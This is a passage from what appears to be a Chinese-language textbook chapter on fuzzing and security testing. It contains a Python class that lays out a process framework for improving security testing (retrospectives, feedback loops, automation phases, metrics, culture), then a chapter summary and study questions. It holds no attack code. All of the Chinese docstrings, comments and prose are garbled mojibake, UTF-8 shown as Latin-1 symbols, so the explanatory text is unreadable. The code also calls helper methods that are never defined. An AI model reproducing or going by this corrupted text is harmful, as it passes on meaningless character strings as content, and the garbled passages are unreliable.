                    'quarterly_reports': ['strategic_metrics', 'roi_analysis']
                }
            },
            
            'improvement_processes': {
                'retrospectives': {
                    'frequency': 'After each release',
                    'participants': 'Cross-functional team',
                    'focus_areas': [
                        'What worked well?',
                        'What didn\'t work?',
                        'What can we improve?',
                        'Action items'
                    ]
                },
                
                'root_cause_analysis': {
                    'triggers': [
                        'Security incidents',
                        'Missed vulnerabilities',
                        'Failed security gates',
                        'Customer reported issues'
                    ],
                    'methodology': 'Five Whys + Fishbone',
                    'output': 'Improvement actions'
                },
                
                'benchmarking': {
                    'internal': 'Compare across teams/projects',
                    'external': 'Industry best practices',
                    'frequency': 'Quarterly'
                }
            },
            
            'knowledge_management': {
                'documentation': {
                    'security_playbooks': 'Step-by-step guides',
                    'lessons_learned': 'Post-incident reports',
                    'best_practices': 'Proven patterns',
                    'tool_guides': 'Usage documentation'
                },
                
                'knowledge_sharing': {
                    'brown_bag_sessions': 'Weekly informal learning',
                    'security_champions_meetup': 'Monthly deep dives',
                    'internal_blog': 'Share experiences',
                    'wiki': 'Centralized knowledge base'
                },
                
                'training_programs': {
                    'onboarding': 'New team member security training',
                    'continuous_education': 'Regular skill updates',
                    'certifications': 'Professional development',
                    'conferences': 'External learning'
                }
            }
        }
    
    def implement_feedback_loops(self):
        """å®æ–½åé¦ˆå¾ªç¯"""
        feedback_mechanisms = {
            'automated_feedback': {
                'tool_effectiveness': {
                    'metric': 'true_positive_rate',
                    'threshold': 0.8,
                    'action': 'Tune or replace tool if below threshold'
                },
                
                'test_efficiency': {
                    'metric': 'time_to_execute_tests',
                    'threshold': '30 minutes',
                    'action': 'Optimize slow tests'
                },
                
                'coverage_gaps': {
                    'metric': 'uncovered_attack_vectors',
                    'threshold': 0,
                    'action': 'Add new test cases'
                }
            },
            
            'human_feedback': {
                'developer_feedback': {
                    'collection_method': 'Surveys and interviews',
                    'frequency': 'Monthly',
                    'focus': 'Tool usability and false positives'
                },
                
                'security_team_feedback': {
                    'collection_method': 'Regular reviews',
                    'frequency': 'Bi-weekly',
                    'focus': 'Process effectiveness and gaps'
                },
                
                'customer_feedback': {
                    'collection_method': 'Incident analysis',
                    'frequency': 'As needed',
                    'focus': 'Missed vulnerabilities'
                }
            }
        }
        
        return feedback_mechanisms
    
    def create_improvement_initiatives(self):
        """åˆ›å»ºæ”¹è¿›è®¡åˆ’"""
        initiatives = []
        
        # åŸºäºæ•°æ®çš„æ”¹è¿›
        data_driven_improvements = self.analyze_metrics_for_improvements()
        
        for area, metrics in data_driven_improvements.items():
            if metrics['performance'] < metrics['target']:
                initiative = {
                    'title': f'Improve {area}',
                    'current_state': metrics['performance'],
                    'target_state': metrics['target'],
                    'actions': self.generate_improvement_actions(area, metrics),
                    'timeline': self.estimate_timeline(area),
                    'resources': self.estimate_resources(area),
                    'success_criteria': self.define_success_criteria(area, metrics)
                }
                initiatives.append(initiative)
        
        return initiatives
    
    def monitor_improvement_progress(self):
        """ç›‘æ§æ”¹è¿›è¿›åº¦"""
        monitoring_framework = {
            'tracking_mechanisms': {
                'project_management': 'Jira/Azure DevOps',
                'metrics_dashboard': 'Grafana/PowerBI',
                'regular_reviews': 'Sprint reviews'
            },
            
            'progress_indicators': {
                'leading_indicators': [
                    'Training hours completed',
                    'Tool adoption rate',
                    'Process compliance rate'
                ],
                
                'lagging_indicators': [
                    'Vulnerability reduction',
                    'MTTR improvement',
                    'Security incident reduction'
                ]
            },
            
            'adjustment_triggers': {
                'off_track': 'Milestone missed by >20%',
                'ineffective': 'No improvement after 3 months',
                'changed_priority': 'Business priority shift'
            }
        }
        
        return monitoring_framework
    
    def implement_automation_improvements(self):
        """å®æ–½è‡ªåŠ¨åŒ–æ”¹è¿›"""
        automation_roadmap = {
            'phase1_quick_wins': {
                'duration': '1-2 months',
                'initiatives': [
                    'Automate security scans in CI/CD',
                    'Create security test templates',
                    'Implement basic reporting'
                ]
            },
            
            'phase2_integration': {
                'duration': '3-4 months',
                'initiatives': [
                    'Integrate multiple security tools',
                    'Centralize security findings',
                    'Automate triage process'
                ]
            },
            
            'phase3_intelligence': {
                'duration': '6-12 months',
                'initiatives': [
                    'ML-based false positive reduction',
                    'Predictive vulnerability detection',
                    'Automated remediation suggestions'
                ]
            }
        }
        
        return automation_roadmap
    
    def measure_improvement_impact(self):
        """è¡¡é‡æ”¹è¿›å½±å“"""
        impact_metrics = {
            'efficiency_gains': {
                'time_saved': 'Hours of manual work eliminated',
                'faster_detection': 'Reduction in time to detect',
                'faster_remediation': 'Reduction in time to fix'
            },
            
            'quality_improvements': {
                'vulnerability_reduction': 'Decrease in production vulnerabilities',
                'severity_reduction': 'Decrease in critical vulnerabilities',
                'coverage_increase': 'Increase in security test coverage'
            },
            
            'business_impact': {
                'incident_reduction': 'Decrease in security incidents',
                'cost_savings': 'Reduced cost of security breaches',
                'compliance_improvements': 'Better audit results',
                'customer_satisfaction': 'Improved security perception'
            }
        }
        
        return impact_metrics
    
    def create_culture_change_program(self):
        """åˆ›å»ºæ–‡åŒ–å˜é©è®¡åˆ’"""
        culture_program = {
            'awareness': {
                'security_newsletters': 'Monthly updates on improvements',
                'success_stories': 'Share wins and learnings',
                'recognition_program': 'Reward security contributions'
            },
            
            'engagement': {
                'hackathons': 'Security-focused innovation',
                'bug_bounty_internal': 'Reward finding issues',
                'security_champions': 'Empower team advocates'
            },
            
            'empowerment': {
                'decision_authority': 'Empower teams to improve',
                'budget_allocation': 'Fund improvement ideas',
                'time_allocation': '20% time for improvements'
            }
        }
        
        return culture_program

# å®æ–½ç¤ºä¾‹
def implement_continuous_improvement():
    ci_framework = SecurityTestingContinuousImprovement()
    
    # 1. å»ºç«‹åŸºçº¿
    current_state = ci_framework.measure_current_state()
    
    # 2. è¯†åˆ«æ”¹è¿›æœºä¼š
    improvement_opportunities = ci_framework.analyze_gaps(current_state)
    
    # 3. ä¼˜å…ˆçº§æ’åº
    prioritized_initiatives = prioritize_improvements(improvement_opportunities)
    
    # 4. å®æ–½æ”¹è¿›
    for initiative in prioritized_initiatives:
        implementation_plan = ci_framework.create_implementation_plan(initiative)
        execute_improvement(implementation_plan)
        
    # 5. ç›‘æ§æ•ˆæœ
    results = ci_framework.monitor_improvement_progress()
    
    # 6. è°ƒæ•´å’Œè¿­ä»£
    ci_framework.adjust_based_on_results(results)
    
    return results
```

æŒç»­æ”¹è¿›å…³é”®è¦ç´ ï¼š
1. **å»ºç«‹åº¦é‡ä½“ç³»**ï¼šå¯é‡åŒ–çš„æŒ‡æ ‡
2. **åé¦ˆå¾ªç¯**ï¼šå¿«é€Ÿè·å–æ”¹è¿›æ•ˆæœ
3. **è‡ªåŠ¨åŒ–ç¨‹åº¦**ï¼šå‡å°‘äººå·¥å·¥ä½œ
4. **çŸ¥è¯†ç®¡ç†**ï¼šç§¯ç´¯å’Œåˆ†äº«ç»éªŒ
5. **æ–‡åŒ–å»ºè®¾**ï¼šå…¨å‘˜å‚ä¸æ”¹è¿›

</details>

### è¿›ä¸€æ­¥ç ”ç©¶

1. å¦‚ä½•å°†å¨èƒæƒ…æŠ¥æœ‰æ•ˆé›†æˆåˆ°å®‰å…¨æµ‹è¯•æµç¨‹ä¸­ï¼Ÿ
2. å®‰å…¨æµ‹è¯•ä¸­çš„éšç§ä¿æŠ¤å¦‚ä½•å®ç°ï¼Ÿ
3. å¦‚ä½•è¯„ä¼°å’Œæå‡å®‰å…¨æµ‹è¯•å›¢é˜Ÿçš„èƒ½åŠ›ï¼Ÿ

## æœ¬ç« å°ç»“

æ¨¡ç³Šæµ‹è¯•å’Œå®‰å…¨æµ‹è¯•æ˜¯ä¿æŠ¤è½¯ä»¶ç³»ç»Ÿå…å—æ”»å‡»çš„å…³é”®é˜²çº¿ã€‚æœ¬ç« æˆ‘ä»¬æ·±å…¥æ¢è®¨äº†ï¼š

1. **æ¨¡ç³Šæµ‹è¯•åŸºç¡€**ï¼šåŸç†ã€åˆ†ç±»å’Œæ•ˆæœè¯„ä¼°
2. **ç°ä»£æ¨¡ç³ŠæŠ€æœ¯**ï¼šè¦†ç›–ç‡å¼•å¯¼ã€æ™ºèƒ½å˜å¼‚å’Œå¹¶è¡ŒåŒ–
3. **å®‰å…¨æµ‹è¯•æ–¹æ³•**ï¼šå¨èƒå»ºæ¨¡ã€æ¼æ´æ‰«æã€SAST/DAST
4. **Webåº”ç”¨å®‰å…¨**ï¼šOWASP Top 10ã€XSSã€CSRFç­‰æµ‹è¯•
5. **æœ€ä½³å®è·µ**ï¼šæµç¨‹é›†æˆã€è‡ªåŠ¨åŒ–ã€åº¦é‡å’Œæ–‡åŒ–å»ºè®¾

å…³é”®è¦ç‚¹ï¼š
- å®‰å…¨æµ‹è¯•éœ€è¦ç³»ç»ŸåŒ–çš„æ–¹æ³•è®º
- è‡ªåŠ¨åŒ–æ˜¯è§„æ¨¡åŒ–å®‰å…¨æµ‹è¯•çš„åŸºç¡€
- æ¨¡ç³Šæµ‹è¯•æ˜¯å‘ç°æœªçŸ¥æ¼æ´çš„æœ‰æ•ˆæ‰‹æ®µ
- å®‰å…¨éœ€è¦èå…¥æ•´ä¸ªè½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸ
- æŒç»­æ”¹è¿›å’Œå®‰å…¨æ–‡åŒ–è‡³å…³é‡è¦

ä¸‹ä¸€ç« ï¼Œæˆ‘ä»¬å°†æ¢è®¨å…ƒæµ‹è¯•ï¼ˆMetamorphic Testingï¼‰ï¼Œäº†è§£å¦‚ä½•è§£å†³æµ‹è¯•é¢„è¨€é—®é¢˜ã€‚